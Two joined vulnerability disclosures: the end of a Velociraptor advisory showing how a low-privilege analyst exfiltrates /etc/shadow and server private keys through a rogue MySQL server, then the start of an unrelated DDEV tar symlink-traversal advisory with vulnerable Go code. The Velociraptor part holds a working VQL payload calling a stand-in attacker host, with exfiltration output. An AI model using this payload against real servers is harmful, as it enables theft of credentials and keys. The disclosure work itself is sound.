Note on intent: `acls/acls.go` documents that specific permission combinations grant admin-equivalent power (`SERVER_ARTIFACT_WRITER` with `COLLECT_SERVER`, `ARTIFACT_WRITER` with `COLLECT_CLIENT`), but the `analyst` role holds none of them and is denied `EXECVE`, `NETWORK`, and `FILESYSTEM_READ` on every sibling plugin. If `ANY_QUERY` is nonetheless intended as trusted, the plugin's own `Permissions(FILESYSTEM_READ)` metadata and the runtime enforcement on all sibling plugins are misleading and should be reconciled; otherwise this is a missing runtime check.

## Reproduction

`ghcr.io/velocidex/velociraptor-server:latest` (v0.77.1), default config, GUI on `https://localhost:8889`, one built-in `analyst` user.

1) As `analyst`, confirm the control: the gated accessor denies the read.

    sql(driver='sqlite', accessor='file', file='/etc/passwd', query='SELECT 1')
    => sql: Field file Accessor file: PermissionDenied: Permission denied: [FILESYSTEM_READ]

2) Start a rogue MySQL server on an attacker host that completes the handshake and answers any query with a `LOAD DATA LOCAL INFILE <target>` packet.

3) As the same `analyst`, call the ungated branch through the notebook query API:

    POST /api/v1/UpdateNotebookCell   (Basic auth + x-csrf-token)
    {"type":"vql","input":"SELECT * FROM sql(driver='mysql',
      connstring='x:y@tcp(<ATTACKER>:4499)/z?allowAllFiles=true', query='SELECT 1')"}

The rogue server receives the file:

    QUERY: 'SELECT 1'
    EXFIL 12860 bytes  /etc/velociraptor/server.config.yaml
      contains: CA private_key, gw_private_key, Frontend private_key

Live-verified: analyst `pocdemo` exfiltrated `/etc/passwd`, `/etc/shadow` (mode 0600), and `server.config.yaml`, each sha256 byte-identical to `docker exec sha256sum`, while `http_client()` on the same account returns `PermissionDenied: [NETWORK]`.

## Impact

* CA and Frontend RSA private keys disclosed: forge client certificates, impersonate the server to every enrolled endpoint.
* Any root-readable file on the server host disclosed (`/etc/shadow`, datastore user records with password hashes, cross-tenant `orgs` data).
* Arbitrary outbound TCP from the server host through the same sink and the `upload_sftp`, `upload_smb`, `upload_azure`, `upload_gcs` plugins.
* Root-owned file creation at any path via the `sqlite` branch (zero-permission `data` accessor plus an in-query `ATTACH DATABASE`).
* Triggered by the lowest built-in query role, default config, one query, no admin interaction.

## Credit

Jan Kahmen, [turingpoint](https://www.turingpoint.de) (jan@turingpoint.de)

summary: DDEV incomplete tar symlink traversal fix allows host file overwrite - Incomplete fix of CVE-2026-32885
details:
## Summary

The CVE-2026-32885 ZipSlip fix added a symlink-target escape check to Untar, but the check rebases an ABSOLUTE symlink target into dest before validating (filepath.Join(dest, "/etc") stays lexically inside dest and passes), while the symlink is then created with the RAW absolute target via os.Symlink(file.Linkname, ...), so a malicious archive plants a host-absolute symlink and a following regular-file entry writes through it, restoring arbitrary host file create/overwrite (reaching $HOME rc-files, hence RCE). Confirmed at HEAD.

## The defect (the symlink check is a no-op for absolute targets)

CVE-2026-32885 (fixed v1.25.2, commit 05cbe299) added a lexical containment check on the entry path and a NEW symlink-target validation. pkg/archive/archive.go, Untar, tar.TypeSymlink case:

```go
if filepath.IsAbs(file.Linkname) {
    resolvedTarget = filepath.Join(dest, file.Linkname)   // line 298: absolute target REBASED into dest
} else {
    resolvedTarget = filepath.Join(fullPathDir, file.Linkname)
}
if !strings.HasPrefix(filepath.Clean(resolvedTarget)+sep, filepath.Clean(dest)+sep) {  // line 302
    return ...escapes destination...                       // line 303
}
_ = os.Remove(fullPath)                                     // line 307
err = os.Symlink(file.Linkname, fullPath)                  // line 310: writes the RAW Linkname
```

For an absolute Linkname like /Users/victim, line 298 computes filepath.Join(dest, "/Users/victim") = dest/Users/victim (lexically inside dest), so the escape check at line 302 PASSES.
